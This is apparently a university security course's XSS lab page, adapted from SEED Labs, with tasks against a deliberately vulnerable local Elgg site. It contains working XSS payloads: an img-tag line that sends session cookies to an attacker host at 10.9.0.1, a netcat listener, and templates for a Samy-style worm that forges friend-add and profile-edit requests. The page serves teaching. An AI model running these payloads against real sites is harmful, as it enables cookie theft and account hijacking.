@@ -1,0 +1,713 @@
+
+<!doctype html>
+<html lang="en">
+
+<head>
+  <title>Computer Security</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="shortcut icon" type="image/x-icon" href="/cs476-2021-spring/favicon.ico">
+
+  <!-- Fonts & TextFormatting -->
+  <link href="https://fonts.googleapis.com/css?family=Proza+Libre:500&display=swap" rel="stylesheet" />
+  <link href="../assets/all.css" rel="stylesheet"> <!--load all fontawesome styles -->
+
+  <!-- Styles -->
+  <link rel="stylesheet" href="../assets/bootstrap.min.css" />
+  <link rel="stylesheet" href="../assets/prism.css" /> <!-- Prism JS & CSS downloaded from: https://prismjs.com/download.html#themes=prism-okaidia&languages=markup+css+clike+javascript+bash+c+csharp+cpp+cmake+docker+git+http+hpkp+hsts+java+javadoc+javadoclike+json+latex+liquid+makefile+markdown+markup-templating+mongodb+nasm+nginx+perl+php+phpdoc+php-extras+plsql+python+regex+ruby+rust+sql+vim+yaml&plugins=line-numbers+command-line+unescaped-markup+normalize-whitespace+toolbar -->
+  <link rel="stylesheet" href="../assets/style.css" />
+
+  <!-- Misc. -->
+  <link rel="stylesheet" href="https://cdn.rawgit.com/afeld/bootstrap-toc/v1.0.1/dist/bootstrap-toc.min.css"/>
+</head>
+
+
+<body data-spy="scroll" data-target="#toc">
+
+<div class="container-fluid col-sm-12 p-4 mb-4">
+<div class="row flex-xl-nowrap m-0">
+
+<div class="d-none d-xl-block col-xl-2">
+</div>
+
+<div class="col-12 col-md-12 col-xl-8 bg-white rounded shadow-lg pb-4">
+<div>
+  <!--Thanks, Tim Holman! http://tholman.com/github-corners/ -->
+
+
+
+
+</div>
+<!-- ACTIVE Announcements -->
+
+<!-- OLD Announcements (hidden in comment environment) -->
+
+
+
+<h1 class="pb-4" id="lab-05-cross-site-scripting-xss-attack-lab">Lab 06: Cross-Site Scripting (XSS) Attack Lab</h1>
+<h1 class="pb-4" id="due-date"> Due Monday October 31st @ 11:59PM</h1>
+
+<h2 class="titletext" id="xss-attack-lab">XSS Attack Lab</h2>
+<p class="subtitletext">Adapted from SEED Labs: A Hands-on Lab for Security Education.</p>
+
+<p>Cross-site scripting (XSS) is a type of vulnerability commonly found in web applications.
+This vulnerability makes it possible for attackers to inject malicious code (e.g., JavaScript) into a victim’s web browser.
+Using this malicious code, attackers can steal a victim’s credentials, such as session cookies.
+Access control policies (i.e., the same origin policy) employed by browsers to protect user credentials can be bypassed by exploiting XSS vulnerabilities.</p>
+
+<p>To demonstrate what attackers can do by exploiting XSS vulnerabilities, we have set up a web application named Elgg.
+Elgg is a very popular open-source social networking web application, and it has implemented a number of countermeasures to remedy XSS threats.
+To demonstrate how XSS attacks work, we have disabled these countermeasures in our installation of Elgg, intentionally making Elgg vulnerable to XSS attacks.
+Without the countermeasures, users can post arbitrary message, including JavaScript code, to user profiles.</p>
+
+<p>In this lab, students need to exploit this vulnerability to launch an XSS attack on the modified Elgg web app
+in a way that is similar to what Samy Kamkar did to MySpace in 2005 through the notorious Samy worm.
+The ultimate goal of this attack is to spread an XSS worm among users,
+such that whoever views an infected user profile will be infected,
+and whoever is infected will add you (i.e., the attacker) to their friend list.</p>
+
+<p>This lab covers the following topics:</p>
+
+<ul>
+  <li>Cross-Site Scripting attack</li>
+  <li>XSS worm and self-propagation</li>
+  <li>Session cookies</li>
+  <li>HTTP GET and POST requests</li>
+  <li>JavaScript and Ajax</li>
+  <li>Content Security Policy (CSP)</li>
+</ul>
+
+<h3 id="resources">Resources</h3>
+
+<ul>
+  <li>Code related to this lab can be found in <code class="language-plaintext highlighter-rouge">05_xss/</code> of our <a href="https://github.com/reesep/csci476-code">class’s GitHub repository</a>.</li>
+  
+  <li><a href="https://portswigger.net/web-security/cross-site-scripting">Cross-Site Scripting (PortSwigger)</a></li>
+  <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction">Introduction to the DOM (MDN)</a></li>
+  <li><a href="https://developer.mozilla.org/en-US/docs/Web/Guide/AJAX">AJAX - Getting Started (MDN)</a></li>
+  <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">Using HTTP cookies (MDN)</a></li>
+  <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie">Document.cookie (MDN)</a></li>
+  <li><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">Same Origin Policy (MDN)</a></li>
+  <li><a href="https://portswigger.net/web-security/cross-site-scripting/content-security-policy">Content Security Policy (PortSwigger)</a></li>
+  <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content Security Policy (MDN)</a></li>
+  <li>Chapter 10 in the <a href="https://www.handsonsecurity.net">SEED Textbook</a>.</li>
+</ul>
+
+<!-- BEGIN Special Section (Use Bootstrap "Card" Styles). This is nice for formatting background, setup, special instructions, etc. -->
+<div class="card bg-secondary border-primary">
+  <div class="card-body">
+
+    <h2 id="environment-setup">Environment Setup</h2>
+
+    <p>In this lab, we will use a variety of websites all running on the same container.
+Notably, the vulnerable Elgg site is accessible at <a href="http://www.xsslabelgg.com/">http://www.xsslabelgg.com/</a>.</p>
+
+    <blockquote>
+      <p><strong>WARNING:</strong> Do not visit these websites outside of the VM / when the local webserver is not running.</p>
+    </blockquote>
+
+    <h3 id="container-setup-and-commands">Container Setup and Commands</h3>
+
+    <p>Please ensure that you have the class repo cloned locally.
+Once this is done, navigate to the <code class="language-plaintext highlighter-rouge">05_xss/</code> directory.
+For example:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cd</span> ~
+<span class="nv">$ </span>git clone https://github.com/reesep/csci476-code.git code <span class="c"># name the local clone 'code'</span>
+<span class="nv">$ </span><span class="nb">cd</span> /home/seed/code/05_xss
+</code></pre></div>    </div>
+
+    <p>We will make use of <a href="https://www.docker.com/resources/what-container"><strong>Docker</strong></a> and <a href="https://docs.docker.com/compose/"><strong>Compose</strong></a> to make working with containers easy.</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># First, build the container</span>
+<span class="nv">$ </span>docker-compose build    <span class="c"># Build the container image</span>
+
+<span class="c"># Next, start/stop the container(s) as needed</span>
+<span class="nv">$ </span>docker-compose up <span class="nt">-d</span>    <span class="c"># Start the container (-d runs container in the background; i.e., detached)</span>
+<span class="nv">$ </span>docker-compose down     <span class="c"># Shut down the container</span>
+</code></pre></div>    </div>
+
+    <!-- Please download the `Labsetup.zip` file to your VM from the lab's website, unzip it, enter the `Labsetup` folder, and use the `docker-compose.yml` file to set up the lab environment. -->
+    <!-- Detailed explanation of the content in this file and all the involved `Dockerfile` can be found from the user manual, which is linked to the website of this lab.  -->
+    <!-- If this is the first time you set up a SEED lab environment using containers, it is very important that you read the user manual. -->
+
+    <!-- In the following, we list some of the commonly used commands related to Docker and Compose. -->
+    <!-- Since we are going to use these commands frequently, we have created aliases for them in the `.bashrc` file within the official SEEDUbuntu 20.04 VM. -->
+    <!--
+```
+$ docker-compose build  # Build the container image
+$ docker-compose up     # Start the container
+$ docker-compose down   # Shut down the container
+
+// Aliases for the Compose commands above
+$ dcbuild       # Alias for: docker-compose build
+$ dcup          # Alias for: docker-compose up
+$ dcdown        # Alias for: docker-compose down
+```
+ -->
+    <!--
+All the containers will be running in the background.
+To run commands on a container, we often need to get a shell on that container.
+We first need to use the `docker ps` command to find out the ID of the container,
+and then use `docker exec` to start a shell on that container.
+We have created aliases for them in the `.bashrc` file.
+-->
+
+    <p>In general for our labs, we will create and start containers that will run in the background
+(i.e., use the <code class="language-plaintext highlighter-rouge">-d</code> flag when bringing your container up).</p>
+
+    <p>At times we may need to run commands on a container — docker makes it pretty easy to attach to a container running in the background and get a shell on that container.
+To run commands on a specific container, we first need to use the <code class="language-plaintext highlighter-rouge">docker ps</code> command to find out the ID of the container,
+and then we can use <code class="language-plaintext highlighter-rouge">docker exec</code> to start a shell on that container.
+<em>(I told you this would be easy!)</em></p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>docker ps <span class="nt">-a</span>   <span class="c"># Show all containers (default shows just running)</span>
+<span class="nv">$ </span>dockps         <span class="c"># Show active containers using custom formatting for docker ps</span>
+<span class="nv">$ </span>docksh &lt;<span class="nb">id</span><span class="o">&gt;</span>    <span class="c"># Connect to container with &lt;id&gt;</span>
+
+<span class="c">### Examples ###</span>
+
+<span class="c"># The following example shows how to get a shell inside hostC</span>
+<span class="nv">$ </span>dockps
+b1004832e275  hostA-10.9.0.5
+0af4ea7a3e2e  hostB-10.9.0.6
+9652715c8e0a  hostC-10.9.0.7
+
+<span class="c"># Attach to the container with an ID that starts with "96"</span>
+<span class="nv">$ </span>docksh 96
+root@9652715c8e0a:/#
+
+<span class="c"># NOTE: If a docker command requires a container ID, you do not need to type the entire ID string.</span>
+<span class="c"># Typing the first few characters will be sufficient so long as it can uniquely identify a container.</span>
+</code></pre></div>    </div>
+
+    <p><strong>Docker/Compose Aliases.</strong>
+For convenience we provide a number of aliases for the commands above.
+Feel free to use them (or don’t).</p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">### see docker aliases ###</span>
+<span class="nv">$ </span><span class="nb">grep </span>docker ~/.bashrc
+</code></pre></div>    </div>
+    <p><strong>Troubleshooting.</strong>
+If you encounter problems when setting up the lab environment,
+please read the <strong>“Common Problems”</strong> section of the <a href="https://github.com/seed-labs/seed-labs/blob/master/manuals/docker/SEEDManual-Container.md">SEED Manual for Containers</a> for potential solutions.
+If you still can’t get things figured out, please connect a member of the course staff.</p>
+
+    <h3 id="dns-configuration">DNS Configuration</h3>
+
+    <p>We have set up several websites for this lab.
+They are all hosted within a single container with IP address <code class="language-plaintext highlighter-rouge">10.9.0.5</code>.
+Your VM should already be configured to have these IP/hostname mappings in the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.9.0.5        www.xsslabelgg.com
+10.9.0.5        www.example32a.com
+10.9.0.5        www.example32b.com
+10.9.0.5        www.example32c.com
+10.9.0.5        www.example60.com
+10.9.0.5        www.example70.com
+</code></pre></div>    </div>
+
+    <p>By using <code class="language-plaintext highlighter-rouge">ifconfig</code> we can verify our host’s IP address within the docker network:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[VM]$ ifconfig
+#...snipped...
+
+br-f2fb40f6b8ae: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 10.9.0.1  netmask 255.255.255.0  broadcast 10.9.0.255
+             ^^^^^^^^
+#...snipped...
+</code></pre></div>    </div>
+
+    <p>In this case, my host can be addressed from a container by accessing <code class="language-plaintext highlighter-rouge">10.9.0.1</code>.
+(This should be the same for you, but you should verify.)</p>
+
+    <h3 id="elgg-web-application">Elgg Web Application</h3>
+
+    <p>In this lab we use an open-source web application called Elgg.
+Elgg is a web-based social-networking application.
+It is already set up in the provided container images.</p>
+
+    <p>We use two containers, one running the webserver (<code class="language-plaintext highlighter-rouge">10.9.0.5</code>), and another running the MySQL database (<code class="language-plaintext highlighter-rouge">10.9.0.6</code>).
+The IP addresses for these two containers are hardcoded in various places in the configuration,
+so please do not change them within the <code class="language-plaintext highlighter-rouge">docker-compose.yml</code> file.</p>
+
+    <h3 id="elgg-user-accounts">Elgg User Accounts</h3>
+
+    <p>We have created several user accounts on the Elgg server;
+the username / password pairs are as follows:</p>
+
+    <ul>
+      <li>admin / seedelgg</li>
+      <li>alice / seedalice</li>
+      <li>boby / seedboby</li>
+      <li>charlie / seedcharlie</li>
+      <li>samy / seedsamy</li>
+    </ul>
+
+    <h3 id="mysql-database">MySQL Database</h3>
+
+    <p>Containers are usually meant to be disposable, so once they are destroyed, all the data inside the containers is lost.
+For this lab, we want to keep the data in the MySQL database (i.e., so that we do not lose our work when we shutdown our container).
+To achieve this, we have mounted the <code class="language-plaintext highlighter-rouge">mysql_data</code> folder on the host machine to the <code class="language-plaintext highlighter-rouge">/var/lib/mysql</code> folder inside the MySQL container.</p>
+    <blockquote>
+      <p>The folder is created inside of <code class="language-plaintext highlighter-rouge">05_xss/</code> automatically once the MySQL container runs once.</p>
+    </blockquote>
+
+    <p>This folder is where MySQL stores its database.
+Thus, even if the container is destroyed, data in the database will persist since it actually resides on the host.
+If you do want to start from a clean database, you can remove this folder:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo rm</span> <span class="nt">-rf</span> mysql_data
+</code></pre></div>    </div>
+
+  </div>
+</div>
+<!-- END Special Section -->
+
+<h2 class="titletext" id="lab-tasks">Lab Tasks</h2>
+<p class="subtitletext">This lab has been tested on the pre-built SEED VM (Ubuntu 20.04 VM).</p>
+
+<h3 id="prep-analyzing-and-crafting-http-requests">Prep: Analyzing and Crafting HTTP Requests</h3>
+
+<p>In this lab, we need to construct HTTP requests.
+To figure out what an acceptable HTTP request in Elgg looks like, and to be able to send modified versions of acceptable HTTP requests, we need a tool that can help us capture, analyze, modify, and send HTTP requests.
+We can use Firefox's developers tools (F12, or CTRL + Shift + I) to analyze HTTP traffic and see how Elgg formats their HTTP requests. Before starting task 1, go to the "network" tab in developer tools and start clicking around on other people's profiles. You should see that the Dev tools window populated with HTTP traffic. Click on one entry and you can see HTTP requests along with their headers. You dont need to include a screenshot of this in your lab report. This is just to help prepare you for some tasks later on :-)</p>
+
+<h3 id="task-1-post-a-malicious-message-to-display-an-alert-window">Task 1: Post a Malicious Message to Display an Alert Window</h3>
+
+<p>The objective of this task is to embed JavaScript code in your Elgg profile, such that when another user views your profile,
+the JavaScript code will be executed and an alert window will be displayed.</p>
+
+<p>The following JavaScript code will display an alert window:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">XSS</span><span class="dl">'</span><span class="p">);</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
+</span></code></pre></div></div>
+
+<p>If you embed the above JavaScript code in your profile (e.g., in the brief description field),
+then any user who views your profile will see the alert window.
+In this case, the JavaScript code is short enough to be typed into the short description field.
+ 
+<br><br><br>
+This will suffice for Task 1, but 
+If you want to run a more substantial piece of JavaScript,
+but you are limited by the number of characters you can type in the form,
+you can store the JavaScript code in a standalone file, save it with the <code class="language-plaintext highlighter-rouge">.js</code> extension,
+and then refer to it using the <code class="language-plaintext highlighter-rouge">src</code> attribute in the <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tag.
+For example:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span>
+    <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://www.example.com/myscripts.js</span><span class="dl">"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
+</span></code></pre></div></div>
+
+<p>In this example, the page will fetch the JavaScript code from <a href="http://www.example.com">http://www.example.com</a>, which can be any web server.</p>
+
+<h3 id="task-2-post-a-malicious-message-to-display-cookies">Task 2: Post a Malicious Message to Display Cookies</h3>
+
+<p>The objective of this task is to embed JavaScript code in your Elgg profile, such that when another user views your profile, the user’s cookies will be displayed in the alert window.
+This can be done by adding additional code to the JavaScript code from the previous task:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
+</span></code></pre></div></div>
+
+<h3 id="task-3-steal-cookies-from-the-victims-machine">Task 3: Steal Cookies from the Victim’s Machine</h3>
+
+<p>In the previous task, the malicious JavaScript code written by the attacker can print out the user’s cookies, but only the user can see the cookies, not the attacker.
+In this task, the attacker wants the JavaScript code to send the cookies to somewhere that the attacker can access the information.
+To achieve this, the malicious JavaScript code needs to send an HTTP request to the attacker, with the cookies appended to the request.</p>
+
+<p>We can do this by having the malicious JavaScript insert an <code class="language-plaintext highlighter-rouge">&lt;img&gt;</code> tag with its <code class="language-plaintext highlighter-rouge">src</code> attribute set to the attacker’s machine.
+When the JavaScript inserts the <code class="language-plaintext highlighter-rouge">img</code> tag, the browser tries to load the image from the URL in the <code class="language-plaintext highlighter-rouge">src</code> field;
+this results in an HTTP GET request sent to the attacker’s machine.
+The JavaScript given below sends the cookies to port 5555 of the attacker’s machine (with IP address <code class="language-plaintext highlighter-rouge">10.9.0.1</code>),
+where the attacker has a TCP server listening on the same port.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;img src=http://10.9.0.1:5555?c=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">escape</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">&gt;</span><span class="dl">'</span><span class="p">);</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
+</span></code></pre></div></div>
+
+<p>A commonly used program by attackers is <code class="language-plaintext highlighter-rouge">netcat</code> (or <code class="language-plaintext highlighter-rouge">nc</code>), which, if running with the <code class="language-plaintext highlighter-rouge">-l</code> option, becomes a TCP server that listens for a connection on the specified port.
+This server program prints out whatever is sent by the client and sends to the client whatever is typed by the user running the server.
+Type the following command below to listen on port <code class="language-plaintext highlighter-rouge">5555</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lknv</span> 5555
+</code></pre></div></div>
+
+<ul>
+  <li>The <code class="language-plaintext highlighter-rouge">-l</code> option is used to specify that nc should listen for an incoming connection rather than initiate a connection to a remote host.</li>
+  <li>The <code class="language-plaintext highlighter-rouge">-v</code> option is used to have <code class="language-plaintext highlighter-rouge">nc</code> give more verbose output.</li>
+  <li>The <code class="language-plaintext highlighter-rouge">-n</code> option forces <code class="language-plaintext highlighter-rouge">nc</code>  to not do any DNS or service lookups on any specified addresses, hostnames or ports.</li>
+  <li>The <code class="language-plaintext highlighter-rouge">-k</code> option indicates that, when a connection is completed, listen for another one.</li>
+</ul>
+
+<h4 id="for-fun">For Fun!</h4>
+
+<p>While running <code class="language-plaintext highlighter-rouge">netcat</code> on the VM is interesting in its own right,
+we can also use other approaches to receive the information exfiltrated from the user’s browser.
+For example, we could use something like <a href="https://webhook.site/">https://webhook.site/</a>,
+which lets you, for instance, easily inspect any incoming HTTP request that is directed to a temporary URL they assign you.</p>
+
+<h3 id="task-4-becoming-the-victims-friend">Task 4: Becoming the Victim’s Friend</h3>
+
+<p>In this and next task, we will perform an attack similar to what Samy did to MySpace in 2005 (i.e. the Samy Worm).
+We will write an XSS worm that adds Samy as a friend to any other user that visits Samy’s page.
+This worm does not self-propagate; in a later task we will make it self-propagating.</p>
+
+<p>In this task, we need to write malicious JavaScript code that forges HTTP requests directly from the victim’s browser, without the intervention of the attacker.
+The objective of the attack is to add Samy as a friend to the victim.
+We have already created a user called Samy on the Elgg server (the user name is <code class="language-plaintext highlighter-rouge">samy</code>).</p>
+
+<p>To add a friend for the victim, we should first find out how a legitimate user adds a friend in Elgg.
+More specifically, we need to figure out what is sent to the server when a user adds a friend.
+(Any tool that helps with HTTP inspection is useful here.)
+By inspecting the contents of HTTP requests, we can identify all of the parameters in the request.
+Once we understand what the add-friend HTTP request look like, we can write JavaScript code to craft and send an identical HTTP request.
+We provide template code that aids in completing the task.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="o">&gt;</span>
+<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">Ajax</span><span class="o">=</span><span class="kc">null</span><span class="p">;</span>
+
+    <span class="c1">// This data is sent by the server (look at the page's source code!)</span>
+    <span class="c1">// and must be included in subsequent requests.</span>
+    <span class="kd">var</span> <span class="nx">ts</span><span class="o">=</span><span class="dl">"</span><span class="s2">&amp;__elgg_ts=</span><span class="dl">"</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_ts</span><span class="p">;</span>           <span class="c1">// (1) elgg CSRF countermeasure</span>
+    <span class="kd">var</span> <span class="nx">token</span><span class="o">=</span><span class="dl">"</span><span class="s2">&amp;__elgg_token=</span><span class="dl">"</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_token</span><span class="p">;</span>  <span class="c1">// (2) elgg CSRF countermeasure</span>
+
+    <span class="c1">// Construct the HTTP request to add Samy as a friend.</span>
+    <span class="kd">var</span> <span class="nx">sendurl</span><span class="o">=</span><span class="p">...;</span>  <span class="c1">//FILL IN</span>
+
+    <span class="c1">// Create and send an Ajax request to add friend</span>
+    <span class="nx">Ajax</span><span class="o">=</span><span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+    <span class="nx">Ajax</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span><span class="nx">sendurl</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
+    <span class="nx">Ajax</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Host</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">www.xsslabelgg.com</span><span class="dl">"</span><span class="p">);</span>
+    <span class="nx">Ajax</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
+    <span class="nx">Ajax</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
+</span></code></pre></div></div>
+
+<p>The above code should be placed in the “About Me” field of Samy’s profile page.
+This field provides two editing modes: Editor mode (default) and Text mode.
+The Editor mode adds extra HTML code to the text typed into the field, while the Text mode does not.
+Since we do not want any extra code added to our attack code, the Text mode should be enabled before entering the above JavaScript code.
+This can be done by clicking on “Edit HTML”, which can be found at the top right of the “About Me” text field.</p>
+
+<h4 id="task-41">Task 4.1</h4>
+
+<p>Carry out the attack to add Samy as a friend to the victim. Describe your strategy and provide supporting code/details.</p>
+
+<!-- #### Task 4.2 -->
+
+<!-- Explain the purpose of lines (1) and (2), and why are they are needed. -->
+
+<h4 id="task-42">Task 4.2</h4>
+
+<p>If the Elgg application only provided the Editor mode for the “About Me” field (i.e., you cannot switch to the Text mode), can you still launch a successful attack?</p>
+
+<h3 id="task-5-modifying-the-victims-profile">Task 5: Modifying the Victim’s Profile</h3>
+
+<p>The objective of this task is to modify the victim’s profile when the victim visits Samy’s page.
+We will write an XSS worm to complete the task.
+This worm does not self-propagate; in a later task we will make it self-propagating.</p>
+
+<p>Similar to the previous task, we need to write malicious JavaScript code that forges HTTP requests directly from the victim’s browser, without the intervention of the attacker.
+To modify profile, we should first find out how a legitimate user edits or modifies their profile in Elgg.
+More specifically, we need to figure out how the HTTP POST request is constructed to modify a user’s profile.
+(Again, any tool that helps with HTTP inspection is useful here.)
+Once we understand how the modify-profile HTTP POST request is formatted, we can write JavaScript code to send out an identical HTTP request.
+We provide template code that aids in completing the task.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="o">&gt;</span>
+<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
+    <span class="c1">// JavaScript code to access user name, user guid, Time Stamp __elgg_ts and Security Token __elgg_token</span>
+    <span class="kd">var</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">&amp;name=</span><span class="dl">"</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">name</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">guid</span><span class="o">=</span><span class="dl">"</span><span class="s2">&amp;guid=</span><span class="dl">"</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">guid</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">ts</span><span class="o">=</span><span class="dl">"</span><span class="s2">&amp;__elgg_ts=</span><span class="dl">"</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_ts</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">token</span><span class="o">=</span><span class="dl">"</span><span class="s2">&amp;__elgg_token=</span><span class="dl">"</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_token</span><span class="p">;</span>
+
+    <span class="c1">// Construct your url.</span>
+    <span class="kd">var</span> <span class="nx">sendurl</span><span class="o">=</span><span class="p">...;</span>     <span class="c1">//FILL IN</span>
+
+    <span class="c1">// Construct the content of your request.</span>
+    <span class="kd">var</span> <span class="nx">content</span><span class="o">=</span><span class="p">...;</span>     <span class="c1">//FILL IN</span>
+
+    <span class="c1">// Send the HTTP POST request</span>
+    <span class="kd">var</span> <span class="nx">samyGuid</span><span class="o">=</span><span class="p">...;</span>    <span class="c1">//FILL IN</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">guid</span><span class="o">!=</span><span class="nx">samyGuid</span><span class="p">)</span>       <span class="c1">// (1)</span>
+    <span class="p">{</span>
+        <span class="c1">// Create and send Ajax request to modify profile</span>
+        <span class="kd">var</span> <span class="nx">Ajax</span><span class="o">=</span><span class="kc">null</span><span class="p">;</span>
+        <span class="nx">Ajax</span><span class="o">=</span><span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+        <span class="nx">Ajax</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span><span class="nx">sendurl</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
+        <span class="nx">Ajax</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Host</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">www.xsslabelgg.com</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">Ajax</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">Ajax</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">content</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
+</span></code></pre></div></div>
+
+<p>Similar to Task 4, the above code should be placed in the “About Me” field of Samy’s profile page,
+and the Text mode should enabled before entering the above JavaScript code.</p>
+
+<h4 id="task-51">Task 5.1</h4>
+
+<p>Carry out the attack to modify the victim’s profile when the victim visits Samy’s page.</p>
+
+<blockquote>
+  <p><em><strong>Hint!</strong></em> You need not send back data in the verbose way that data is sent in a typical “edit” request
+(i.e., using <code class="language-plaintext highlighter-rouge">Content-Type: multipart/form-data</code>, specifying a boundary, etc. ).
+It turns out you can also indicate <code class="language-plaintext highlighter-rouge">Content-Type: application/x-www-form-urlencoded</code>,
+as we do in the provided template above,
+and as a result you can send back the data as one query string.
+This is basically what we’ve done before where we have passed data in the form of
+name/value pairs that are separated by the ampersand (<code class="language-plaintext highlighter-rouge">&amp;</code>),
+and names are separated from values by the equals symbol (<code class="language-plaintext highlighter-rouge">=</code>).
+The only difference now is that we send back the data as part of the body of the request.
+Even this is handled for you though — just make sure that the <code class="language-plaintext highlighter-rouge">content</code> variable contains the
+properly-formatted data that you want to send to the server as part of your “edit” request.
+<br /><br />
+See this Stack Overflow post for a little more info:
+<a href="https://stackoverflow.com/a/4073451">https://stackoverflow.com/a/4073451</a>.</p>
+</blockquote>
+
+<h4 id="task-52">Task 5.2</h4>
+
